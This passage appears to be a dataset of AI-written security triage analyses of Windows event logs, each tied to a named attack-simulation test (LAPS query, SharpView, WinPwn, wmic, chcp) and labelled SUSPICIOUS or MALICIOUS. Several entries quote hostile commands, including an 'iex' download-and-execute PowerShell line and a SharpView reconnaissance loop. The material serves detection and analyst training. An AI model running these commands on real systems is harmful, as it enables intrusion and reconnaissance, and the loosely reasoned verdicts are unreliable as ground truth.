   - Review account credential handling and attempt sources to enhance security configurations.

3. **Routine Assessment**:
   - Conduct regular analysis of DCOM configuration and any registry modifications to ensure they align with known administrative procedures. 

Proceed with the recommendations for ensuring systems and operations remain secure until all identified suspicions are thoroughly investigated and cleared."
Windows MachineGUID Discovery,"### Analysis:

Upon reviewing the provided event logs, several instances of potentially suspicious activity have been identified. However, a holistic review of the logs is crucial to determine whether these activities are indeed malicious or if they are benign or warrant further investigation.

#### Suspicious Activities:

1. **Execution of Built-in Windows Utilities**:
   - Multiple executions of `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `cmd.exe` with a high integrity level under `SERVER002\admin_test` have been logged. 
   - `whoami.exe` and `hostname.exe` are typically benign but can be used by attackers during reconnaissance.
   - The frequent execution of `wevtutil.exe` is of concern as it may be used to clear event logs or query detailed information, which might be indicative of log tampering attempts or detailed reconnaissance.
   - The `cmd.exe` process running a `REG QUERY` command could suggest an attempt to gather information about the system's configuration, specifically querying the MachineGuid registry key, which is often targeted to uniquely identify a machine.

2. **Command Line Attributes**:
   - The command execution sequence appears systematic and could be part of an automated script or reconnaissance activity, though the specific commands (like querying the registry for MachineGuid) aren't inherently dangerous—they might indicate data gathering for more strategic attacks or external engagements.

3. **Potential Time Manipulation**:
   - The system logs indicate a change in system time, as observed in `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` logs around ""17:31:48"". Time changes can be legitimate (e.g., time synchronization) but also used by adversaries to potentially hide activities by aligning log timestamps. This behavior should be further verified to rule out malicious intent.

### Assessment:

The activities observed do appear suspicious due to:
- The sequence and nature of executed utilities, which can form part of a reconnaissance phase by malware or an attacker.
- The potential unauthorized querying of system registry keys.
- Time manipulation which, while capable of being benign, coincides with the timeframe of these potentially malevolent activities.

### Resolution:

- **SUSPICIOUS**: The activity noted raises concerns predominantly due to the potential use of powerful internal tools that, when used illegitimately, can lead to data reconnaissance, transportation, and eventual compromise. However, additional context and information, like network logs, user verification, and intent confirmation, are necessary to solidify this judgment.

### Recommended Actions:

1. **Further Investigation**:
   - Review the machine's historical activity logs to identify if similar command patterns were executed.
   - Check for any unauthorized access or anomalies in user patterns on the `SERVER002\admin_test` account.
   - Conduct network traffic analysis to verify if any data exfiltration attempts correlate with these activities.

2. **Containment and Monitoring**:
   - Increase monitoring on the CEO's machine and implement stricter logging for sensitive commands and processes.
   - Set up alerts for high-integrity-level command executions, especially those involving `cmd.exe`, `whoami.exe`, `wevtutil.exe`, and `reg.exe`.

3. **User Communication**:
   - Confirm if the user was performing legitimate tasks that required these executions, eliminating benign usages and reducing false alarms in the future.

By following these actions, any potential threats can be better managed, and organizations can prevent or swiftly respond to actual malicious activities."
Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"After analyzing the provided Windows event logs across the various channels (System, Security, PowerShell, Sysmon, and Application), we can summarize the findings as follows:

1. **System Log Analysis:**
   - The logs reflect typical system operations, such as time adjustments using `svchost.exe`, part of routine Windows background services. 
   - No overtly suspicious behavior is observed here as the process involved (`svchost.exe`) is a legitimate Windows service host process and no anomalies in timestamps or timezone indicate substantial tampering.

2. **Security Log Analysis:**
   - These logs primarily show `4616` event IDs indicating system time changes, which appear to correlate with the system log time adjustments.
   - The process involved, `C:\Windows\System32\svchost.exe`, is consistent with the Windows Time service which regularly updates the system time.

3. **PowerShell Log Analysis:**
   - The entries show the initialization of various PowerShell providers but do not have specific command execution details.
   - The PowerShell command observed is invoking a script to query or use `ms-Mcs-AdmPwd` and related attributes, typically involved with Local Admin Password Solution (LAPS). 
   - While LAPS is a security feature to manage local admin passwords, its use should be monitored as it might be indicative of an inventory or privileged activity.
   - Given the context and environment (Server002) this log might be authorized admin activity, but without a clear assurance, it needs further exploration.

4. **Sysmon Log Analysis:**
   - A notable pattern of process creation events related to several executions of `HOSTNAME.EXE`, `whoami.exe`, and batch processing by `PowerShell.exe` was observed.
   - Of particular interest are multiple instances of `MicrosoftEdgeUpdate` processes. Typically, this would represent Microsoft Edge updates, however, the frequency and volume are unusually high.
   - However, activity seems to align with common software update patterns for Microsoft Edge, likely occurring due to scheduled automatic updates.

5. **Application Log Analysis:**
   - The logs mark regular software protection activities managed by Windows SPP Service and some entries related to `edgeupdate`, further confirming the software update processes.
   - Given the timestamps closely align with Sysmon logs for Microsoft Edge Update, this corroborates an update event.

### Assessment and Recommendations:
- **Overall Analysis**: The event logs appear to present typical system operations related to time synchronization and software updates. The PowerShell activity, while typically benign, involves access to sensitive password attributes, suggesting the need for validating the context of its execution.
  
### Resolution:
- **Final Verdict**: **SUSPICIOUS**

### Recommendations:
- **Further Investigation**: The PowerShell command usage should be reviewed against authorized scripts and use cases, particularly checking against the company's policy of managing and accessing LAPS attributes.
- **Continuous Monitoring**: Ensure Sysmon and other endpoint detection tools keep providing detailed logging to catch any anomalies early, focusing on process creations and unusual command-line arguments.
- **Policy Verification**: Confirm that the system's Edge update schedule aligns with company policy and ensure updates do not coincide with any unauthorized periods or suspicious access patterns.
- **Security Posture Check**: Confirm that Active Directory settings and LAPS implementations are all according to security best practices, keeping track of any alterations or escalations."
Examine domain password policy - Windows,"Based on the analysis of the provided Windows event logs, we will evaluate each category of logs to identify any suspicious or anomalous activities and assess the overall security posture of the system.

### System Log Analysis
- **Time Changes:** There are several events related to time change (Event ID: 1, from `Microsoft-Windows-Kernel-General`). The `svchost.exe` process is responsible for these changes, which may be associated with synchronization to an NTP server (`time.windows.com`). Time changes themselves are not inherently suspicious but can indicate tampering in some contexts if additional suspicious activities are present.
  
### Application Log Analysis
- **Software Protection Platform Service:** The Application log only records a normal operation of the `Software Protection Platform Service` (Event ID: 16384). No suspicious behavior is noted here.

### Security Log Analysis
- **Logon/Logoff Events:**
  - Event ID 4624 suggests successful logon events with NTLM authentication. The privilege escalation events (Event ID: 4672) show the user `admin_test` acquiring a range of privileges such as `SeDebugPrivilege`, which can be used for malicious purposes.
  - Event ID 4634 records a logoff for `admin_test`. 

### Sysmon Log Analysis
- **Process Execution:**
  - Multiple executions of system utilities like `whoami.exe`, `hostname.exe`, `net.exe`, and `cmd.exe` are found, executed by the user `admin_test`. The usage, especially of `net accounts /domain`, indicates enumeration which could be part of an attacker’s reconnaissance phase.
  - There are frequent executions of critical system processes (`wevtutil.exe`, `conhost.exe`) by `admin_test`, which could be consistent with an investigation or, alternatively, malicious tampering.

### Assessment and Conclusion
Considering the combination of privileged logon events, enumeration activities (`net accounts /domain`), and the number of accessed system utilities by a user acquiring several administrative privileges, this activity is **suspicious**. The activity pattern could be indicative of a penetration tester's operation or early stages of an attack.

### Recommendation
1. **Investigation**: This activity should be investigated further to determine if the `admin_test` user account's actions are authorized and whether they've been observed during known penetration tests or audits.
2. **Monitoring**: Enhance monitoring on the account `admin_test`, especially for unusual patterns and sequences of administrative and network commands.
3. **Validation**: Check if any similar activities coincide with scheduled administrative tasks or known user behavior.
4. **Network Monitoring**: Analyze network logs around these timestamps to detect any lateral movement or exfiltration attempts.

**Resolution: SUSPICIOUS**"
Use of SecEdit.exe to export the local security policy (including the password policy),"**Analysis of Provided Logs:**

Upon detailed analysis of the provided Sysmon event logs, the following observations and assessments are made:

1. **Microsoft Edge Update Activity:**
   - Multiple logs indicate the execution of `MicrosoftEdgeUpdate.exe` and related components (e.g., `MicrosoftEdgeUpdateComRegisterShell64.exe`) under `NT AUTHORITY\SYSTEM` privilege.
   - The presence of Microsoft Edge Update processes is typically associated with routine operations for updating the Microsoft Edge browser. The logs do not show any unusual command-line arguments indicating tampering or malicious intent.
   - The activity aligns with expected behavior for an Edge update process running with high integrity level as a system process.

2. **Whoami and Hostname Executions:**
   - The logs show executions of `whoami.exe` and `hostname.exe` from the user `SERVER002\admin_test` with high integrity level.
   - These utilities are often used to gather information about the current user and system. However, in isolation, they are benign and do not indicate malicious activity unless correlated with other suspicious behaviors like privilege escalation or unauthorized access attempts.

3. **Command Prompt with SecEdit Usage:**
   - A `cmd.exe` process executed the command: `secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt`, which exports the security policy configuration.
   - While this can be a legitimate administrative action, unauthorized attempts to export security configurations can indicate reconnaissance attempts. The activity should be corroborated with the user's role and intended tasks.

4. **Use of Wevtutil Utility:**
   - Wevtutil is observed being executed multiple times by the user `SERVER002\admin_test`.
   - This tool is typically used to manage event logs, and excessive or unexplained use might raise suspicion, especially in environments where a standard user does not require such access frequently.

5. **Absence of Evidence in Other Logs:**
   - Notably, there are no relevant entries or supporting evidence found within the Windows PowerShell, System, Security, or Application logs to indicate scripting or illicit system modifications.

**Assessment:**

The logs provide a mixed set of activities primarily revolving around legitimate system tools and update processes. The absence of aberrant behavior such as exploitation tactics, anomalous syntax in the command line, or indisputable evidence of unauthorized access or data exfiltration leads to the following conclusion:

- **Resolution: SUSPICIOUS**

The combination of `secedit` and `wevtutil` usage deserves further investigation due to their potential for misuse in security circumvention or reconnaissance activities. It is recommended to verify the context of these actions, particularly who performed them and for what purpose, to rule out any potential unauthorized or risky practices.

**Guidance for Proceeding:**

1. **User Validation:**
   - Confirm with IT or security operations whether the observed actions align with the user `SERVER002\admin_test`'s standard responsibilities.
   
2. **Further Monitoring and Rule Enhancement:**
   - Implement enhanced monitoring for repeated use of administrative tools especially by non-administrative users.
   - Consider establishing alerts on sensitive command-line executions and privilege escalations.

3. **Conduct Interviews:**
   - Conduct follow-up interviews or inquiries with involved personnel to validate the legitimacy of the actions.

If subsequent investigations validate these actions as authorized, the activity could be deemed benign. Otherwise, uncovering a lack of authorization or intent could reclassify the suspicion.

"
System Discovery using SharpView,"### Analysis of Windows Event Logs

#### Key Indicators:

1. **Suspicious PowerShell Activity**:
   - A PowerShell process (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) is invoked with a command line that involves a script running SharpView, which is a known PowerShell toolkit used for active directory enumeration and post-exploitation.
   - The specific command is: `powershell.exe & {$syntaxList = \""Invoke-ACLScanner\"", \""Invoke-script\"", \""Find-DomainShare\"", foreach ($syntax in $syntaxList) {C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\SharpView.exe $syntax -}}`. This suggests someone running multiple reconnaissance commands using SharpView.

2. **Multiple `wevtutil.exe` and `conhost.exe`** Processes:
   - The `wevtutil.exe` process is executed multiple times. This utility allows command-line access to event logs, which could be used for both legitimate administrative tasks and attempts to clear security logs.
   - The repeated spawning of `conhost.exe` could be indicative of command shell sessions being opened, which is oftentimes observed in scripted or automated activities.

3. **High-privilege Account Usage**:
   - The user `SERVER002\admin_test` is consistently used for executing these processes with high integrity levels, potentially indicating an administrator account is leveraged.

4. **Standard Legitimate Processes**:
   - Several processes like `TrustedInstaller.exe`, `TiWorker.exe`, `taskhostw.exe`, and Windows Update related processes (`UsoClient.exe`, `MicrosoftEdgeUpdate.exe`) are spawned under `NT AUTHORITY\SYSTEM`. These are typical for system operations and updates.

5. **Security Event Logs**:
   - Multiple security events (Event IDs 4624, 4672) show successful logins and privileged access being granted to `SYSTEM`. This could be standard if part of regular system maintenance scripts but should be correlated with time and context.

6. **Defender Active**:
   - Windows Defender is repeatedly logging as active, which provides some level of assurance that antivirus processes are running.

### Assessment

**Classification: SUSPICIOUS**

The activities seen within the logs raise suspicion due to:

- **Reconnaissance commands** using PowerShell with SharpView, which is typically used in post-exploitation scenarios to gather information about the environment.
- Frequent usage of `wevtutil.exe` could imply intentions to manipulate or read sensitive logs without leaving a trace.
- The consistent use of a non-system high-privilege account, which could indicate misuse or compromise of admin credentials.

### Recommendations

1. **Immediate Investigation**:
   - Perform detailed examination of the `admin_test` account activities to determine if the account has been compromised.
   - Retrieve and analyze additional logs to identify the origin of the PowerShell command execution to determine the responsible user or originating IP.

2. **Enhanced Monitoring**:
   - Increase monitoring on the `SERVER002\admin_test` account and related admin-level accesses.
   - Enable more rigorous logging for Microsoft PowerShell and watch for abnormal PowerShell process creations.

3. **Account and Command Review**:
   - Review the accounts that have been granted high-level privileges recently through Event ID 4672.
   - Closely audit executed scripts and software (e.g., SharpView) for their legitimacy and origin.

4. **Security Posture Review**:
   - Ensure that all endpoint protection mechanisms are up to date and effectively configured, focusing on detecting and preventing PowerShell abuse.

5. **Incident Response**:
   - Consider isolating the systems associated with suspicious activities until a clear understanding and resolution are achieved.

This incident should be treated as potentially indicative of a breach or attempted compromise, and further investigation is necessary to ensure the security of the environment."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"### Detailed Analysis

Upon reviewing the provided Windows event logs consisting of System, Sysmon, Windows PowerShell, and Application logs, the following observations can be made:

#### System Log
1. **Time Changes:**
   - The system log reflects a series of time changes (`EventID: 24` and `EventID: 1`). These appear to be regular synchronizations with time.windows.com and adjustments executed by the `svchost.exe` process. While time changes can occasionally be used to obscure malicious activity, there are no immediate indicators of compromise related to this activity.

2. **Event ID 35:**
   - The system time source is updated as reflected in `EventID: 35`, choosing `time.windows.com`. This is generally benign as it indicates standard NTP operations.

#### Sysmon Log
1. **Process Creation and Execution:**
   - Repeated executions of `wevtutil.exe` and `conhost.exe` are observed under the user `SERVER002\admin_test`. The utilization of `wevtutil.exe` could be suspicious if it reflects an unauthorized attempt to clear or query event logs, but here it appears more associated with administrative tasks as it's linked to the execution of `MicrosoftEdgeUpdate.exe`.

2. **Execution of PowerShell Commands:**
   - The execution of a PowerShell script, notably using `Get-CimInstance` and `Get-WmiObject` to query antivirus product status from `root/securityCenter2`, is evident. While these commands are not inherently malicious, if executed without prior authorization or routine, they may suggest an attempted reconnaissance or health check of the antivirus status.

3. **Updates and Software Installations:**
   - The execution traces of `MicrosoftEdgeUpdate.exe` in various instances indicate legitimate software update procedures for Microsoft Edge. The server is receiving regular updates and checks for the browser, which seems routine.

#### Windows PowerShell Log
- There are clear indicators of started PowerShell sessions running commands to query antivirus information. While the commands themselves are standard Windows administrative functions, the context of execution without further context could imply potential suspicious activities. This aligns with potential administrative checks.

#### Application Log
- The log indicates the routine stopping of EdgeUpdate services, which complements the update activities seen in the Sysmon logs, thus reinforcing the narrative of active updates being the source of the logged activities.

#### Security Log
- The events show `LOCAL SERVICE` executing actions consistent with observed system time adjustments but nothing explicitly indicative of unauthorized access or privilege escalation.

### Assessment

Upon comprehensive review, no immediate evidence of overtly malicious activity such as privilege escalation, unusual processes, or recognized attack patterns is found. However, the observation of potentially unusual administrative queries, specifically PowerShell commands checking antivirus statuses, warrant further confirmation with IT or the responsible admin to ascertain context and ensure authorization.

### Resolution
Given the logs' nature and observed activities:

- **Resolution: SUSPICIOUS**

**Next Steps**:
1. Confirm with the system/network administrator or the CEO's IT support team regarding the usage of `Get-CimInstance` and `Get-WmiObject` commands to ensure they are part of legitimate operations.
2. Conduct an audit on user accounts, especially `SERVER002\admin_test` to verify the legitimacy and necessity of the executed activities.
3. Consider a more detailed analysis or heuristic scanning of the involved system for anomalies if the context of PowerShell use cannot be immediately reconciled."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"Upon analyzing the provided Windows event logs from the CEO's machine, several observations can be made:

### Summary of Logs:
1. **Application Log:**
   - Contains entries indicating that Windows Defender is active. This appears normal for endpoint protection.

2. **Windows PowerShell Log:**
   - Shows multiple entries indicating the execution of a PowerShell command that is using the `iex (Invoke-Expression)` command to download and execute a script from the internet. The command is:
     ```powershell
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/script.ps1')
     ```
   - This behavior is highly suspicious as it signifies potential unauthorized remote script execution, which is a common method used for exploiting or gaining unauthorized access to systems.

3. **Sysmon Log:**
   - Multiple entries of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`, executed in quick succession.
   - Notably, there is a Sysmon log capturing the execution of `powershell.exe` with the same suspicious command seen in the PowerShell logs.

4. **Security Log:**
   - Contains logs related to time changes which could be part of expected system operations. However, any alterations in system time should be investigated as they can obscure the timeline of events.

5. **System Log:**
   - Logs indicating kernel general time changes. Similar to security logs, ensure time changes align with authorized activities.

### Analysis:
- **Suspicious PowerShell Activity:**
  - The use of `Invoke-Expression` (`iex`) alongside downloading scripts from external sources is a known technique used by attackers for executing malicious code. This kind of usage should be investigated thoroughly as it is often associated with malware delivery mechanisms.
  
- **Pattern of Process Executions:**
  - The temporal proximity between various legitimate processes (`hostname.exe`, `whoami.exe`, etc.) whenever PowerShell is executing the suspicious script suggests they might be involved in reconnaissance or system survey activities, potentially to figure out the environment for further exploitation.

### Assessment:
- The logs present a clear indication of potentially malicious behavior due to:
  1. Execution of scripts downloaded from the internet using `Invoke-Expression`.
  2. Quick succession of process executions associated with this script.

### Recommendations:
- **Immediate Actions:**
  - Block the URL from which the script was downloaded in the network firewall/browser proxy.
  - Isolate the suspicious machine from the network to prevent further potential spread or exfiltration of data.
  - Conduct a thorough forensic analysis of the machine, including memory and disk analysis, particularly looking at recent file changes and network connections established around the time of the script execution.

- **Post-Incident Activities:**
  - Review security policies and implement stricter PowerShell execution policies, possibly employing logging and only allowing signed scripts to run.
  - Educate users about the risks of executing scripts or downloading unknown content.

### Resolution:
- The activity captured in the logs is **MALICIOUS**. The use of PowerShell to download and execute a script from an external URL using `Invoke-Expression` is clear evidence of malicious intent and potential compromise."
Process Discovery - PC Hunter,"Based on the provided logs, let's analyze the activities captured:

### Security Log Analysis

- **EventID 4672**: This event represents special privileges assigned to new logons. Both occurrences involve the user ""admin_test"" who is granted high-level privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are commonly abused by attackers to escalate privileges or manipulate system security settings.

- **EventID 4624**: These logon events indicate a network logon (LogonType 3) using the NTLM authentication method, related to the user ""admin_test"". The user authenticated from ""DESKTOP-3HL5B2P"", which could suggest remote access or movement across systems.

- **EventID 4634**: These logoff events also involve the user ""admin_test"", showing that the sessions were terminated.

### Windows PowerShell Log Analysis

- PowerShell is used to execute `PCHunter64.exe` from `C:\Temp\Externalfiles\`. PC Hunter is a known tool for analyzing and exploring the system internals, often used by attackers to gain more insight and control over a compromised system. The launching of this tool is suspicious, especially from a temporary directory.

### System Log Analysis

- **EventID 7045**: A new service with `ImagePath` as `MpKslDrv.sys` was installed. This file is located under `Windows Defender` updates and seems to be a kernel mode driver. While the location is benign in appearance, it should still be verified that this hasn't been tampered with, as installing a new driver can be a method of maintaining persistence on a system.

### Application Log Analysis

- **EventID 4097**: Certificates are being checked related to StartCom and WoSign, which can indicate activities either related to legitimate certificate verifications or possibly tampering with trusted root certificates, affecting the integrity of secure communications.

### Sysmon Log Analysis

- Multiple entries show ""admin_test"" executing processes like `powershell.exe` and `PCHunter64.exe`. The execution path, usage of PowerShell, and use of advanced tools like PCHunter hint towards potentially suspicious activities. 
- The usage of command-line tools such as `whoami.exe` and `hostname.exe` from a high-integrity context suggests a user checking identities and system details, which could be part of reconnaissance or privilege escalation efforts.

### Conclusion and Assessment

There are several indicators that suggest anomalous behavior:
- Use of high privileges.
- PowerShell execution with potentially harmful purpose (invoking a tool like PCHunter).
- Creation of potentially suspicious driver service.
- NTLM authentication from unknown remote workstation.

These factors, especially the use of potentially malicious tools and high privileges, are strong indicators of a possible compromise.

### Resolution

Given the evidence of potentially malicious tools and privileged access, the resolution is:

**MALICIOUS**

### Guidance

- **Immediate Investigation**: Conduct a deeper forensic analysis of `Server002` and `DESKTOP-3HL5B2P` to identify further signs of compromise.
- **Containment**: Isolate affected systems from the network to prevent lateral movement or data exfiltration.
- **Eradication and Recovery**: After thorough investigation and identification of compromise points, perform cleaning or rebuilding of the systems as needed.
- **Security Enhancements**: Review and adjust security policies, enhance monitoring, and verify the configuration of privileged accounts and remote access controls.
- **User Awareness**: Conduct security training sessions to make users aware of the risks posed by executing unknown or untrusted software."
Discover System Language with chcp,"Upon reviewing the provided logs, I have identified several key points to consider regarding potentially suspicious or malicious activity:

### Analysis:

1. **Repeated Execution of System Utilities:**
   - The logs reveal repeated executions of system utilities `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. Wevtutil is commonly used to manage event logs, and its repeated execution can indicate a script or automated task. However, this by itself might not be suspicious if this user typically performs log management.

2. **Execution of Network Service Processes:**
   - The execution of `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, and other native Windows services by `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE` seem consistent with normal Windows operations.

3. **Time Discrepancies:**
   - Notably, there are events indicating a change in system time. This can be legitimate but can also be a tactic used to manipulate logs or bypass certain security mechanisms. The time was adjusted back, then corrected almost immediately, possibly indicating synchronization with a time server.

4. **The Execution of `cmd.exe` and Associated Processes (from `conhost.exe` and `whoami.exe`):**
   - `cmd.exe` was executed with the command line parameter `""/c chcp""`, which changes the active code page number. This series of command line executions may suggest a script or batch file being executed. The presence of `whoami.exe` checks user privileges, which could be part of an enumeration step in a manual or automated script.

5. **Privileged User `admin_test`:**
   - The `admin_test` account conducts operations with a high integrity level and holds numerous privileges, as evident from the security logs (Event ID: 4672). These include `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which indicate high-level account permissions typically needed for administrative tasks.

6. **High Privilege Logons:**
   - There are mentions of NTLM logons, which are expected, but correlated with a high number of privileged operations by `admin_test`.

### Assessment:

- **`Suspicious`:** The activity noted raises suspicion due to the combination of privileged account actions, repeated use of administrative utilities, and time manipulation. Given the corporate context and user level (`admin_test`) performing these actions, further investigation is recommended.
  
### Recommended Actions:
1. **Verify User Activity:**
   - Confirm whether the actions match routine tasks performed by `admin_test` through job role clarifications.
  
2. **Examine Time Set Events:**
   - Investigate why the system time was altered. Check for matching network time synchronization logs.

3. **Scrutinize Command Line Executions:**
   - Review executed batch scripts or scheduled tasks on the system to identify the origin of command line instructions executed by `cmd.exe`.

4. **Monitor and Log User `admin_test` Operations:**
   - Enable enhanced logging and monitor subsequent activities related to this particular user for signs of unauthorized access or privilege misuse.

5. **Ensure System Integrity:**
   - Conduct a thorough system integrity check to find potential unauthorized changes to system files or configurations.

In summary, the findings are `SUSPICIOUS`, warranting further investigation to determine the legitimacy and intention behind the identified activities."
Process Discovery - wmic process,"In the provided Windows event logs, several notable activities warrant closer examination to determine whether they might be indicative of suspicious or malicious behavior.

1. **Time Change Events**:
   - There are multiple EventID 4616 from the Security log indicating a change in system time. The logs show the time being set backwards slightly. Although time changes can sometimes be legitimate (e.g., synchronization with a time server), frequent or unexplained changes, especially setting time backward, can be indicators of attempts to erase event logs or timestamps to cover tracks by malicious actors.
   
2. **Processes Executed by 'admin_test'**:
   - The Sysmon logs capture several processes executed by the user account 'admin_test' that could be indicative of typical reconnaissance activities:
     - `wevtutil.exe`: Frequently listed, this utility is used for managing event logs, which could be used to clear or export logs.
     - `whoami.exe`: Used to display user information; however, it's more commonly used by attackers to assess their access level.
     - `cmd.exe` invoking `wmic process get /format:list`: Indicates querying system processes, a reconnaissance action that could be used to gather information about the system.

3. **Use of Command-Line Utilities**:
   - The use of command-line utilities like `wevtutil.exe`, `hostname.exe`, and `wmic.exe` in quick succession is often associated with scripting and automation tools used in attacks to collect information or manipulate system configurations. The specifically crafted command-line arguments suggest potential misuse for information gathering or configuration changes.

4. **High Integrity Level Executions**:
   - The processes executed under the 'High Integrity Level', such as `cmd.exe` and `wmic.exe`, raise concerns as these indicate administrative privileges which could result in significant system modifications if in the wrong hands.

5. **Absence of PowerShell and explicit malicious scripts**:
   - Notably, there is no logged usage of PowerShell, which is a common tool for penetration testing and post-exploitation (its absence is not inherently suspicious but worth noting depending on expected usage patterns).

**Assessment**:
The pattern of system time changes, coupled with unusual command-line activity and administrative-level process executions, suggest potentially suspicious activity. These could align with steps commonly associated with cyber attacks, such as reconnaissance and log manipulation.

**Conclusion**:
**SUSPICIOUS** - The logs contain activities that exhibit characteristics of suspicious behavior typically noted in systems undergoing reconnaissance or pre-attack preparation. Specifically, the time changes and admin-level process executions warrant further investigation to determine the intention, legitimacy, and context behind these events.

**Recommended Actions**:
1. **Investigate and validate the System Time Changes**: Understand why the system time was altered and verify if this correlates with legitimate system maintenance or updates.
2. **Examine User Activity**: Investigate the actions and process executions by the 'admin_test' account to determine if they align with expected administrative tasks.
3. **Review Security Controls**: Ensure that existing security mechanisms like endpoint detection and response (EDR) are capturing sufficient data and alerts for potentially malicious administrative activities.
4. **Log Review and Correlation**: Further review associated logs (PowerShell, Windows System logs) and network logs for any related activities that could provide additional context or confirm suspicions."
